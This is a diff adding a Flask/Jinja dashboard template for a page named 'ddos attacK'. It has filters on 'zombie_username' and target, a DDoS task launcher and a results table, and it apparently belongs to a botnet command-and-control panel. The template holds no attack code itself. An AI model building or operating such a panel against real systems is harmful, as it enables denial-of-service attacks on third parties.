@@ -1,0 +1,49 @@
+
+
+{% extends "pages/dashboard/base_dashboard.html" %}
+
+{% block lateral_panel %}
+
+{% with data_type = 'ddos_attacks', window_type = 'filter', filters=('zombie_username', 'datetime', 'target') %}
+    {% include 'objects/windows/filter.html' %}
+{% endwith %}
+
+{% if data_filter.data %}
+
+  {% with data_type='ddos_attacks', window_type = 'launcher', task_type=task_type, img_class = 'launcher-img-l', banner = 'img/genkidama.webp', icon = '🚦', panel_title = 'ddos attacK' %}
+    <div id="{{ data_type + '-launcher' }}" class="launcher-m">
+      {% include 'objects/windows/launcher.html' %}
+    </div>
+  {% endwith %}
+
+{% endif %}
+
+{% endblock %}
+
+
+
+{% block central_panel %}
+
+{% if attacks_deleted %}
+  {% with window_type = 'popup', data_type='tasks', operation='deleted', data=attacks_deleted, close_button_action = 'link', close_link = url_for('attacks_bp.ddos_attacks'), img='img/gta2busted.jpg' %}
+    {% include 'objects/windows/popups/updated-data.html' %}
+  {% endwith %}
+{% endif %}
+
+
+{% if data_filter.data %}
+
+  {% with data=data_filter.data, window_type = 'table-results', data_type = 'tasks', task_type = 'dos', data_buttons=True, scrollable_table=True, table_class='table-xl' %}
+    {% include 'objects/windows/data-results.html' %}
+  {% endwith %}
+
+
+{% else %}
+
+{% with data_type = 'ddos_attacks', banner = 'img/genkidama.webp', icon = '🚦', panel_title = 'ddos attacK' %}
+  {% include 'pages/dashboard/tools/base_attack.html' %}
+{% endwith %}
+
+{% endif %}
+
+{% endblock %}
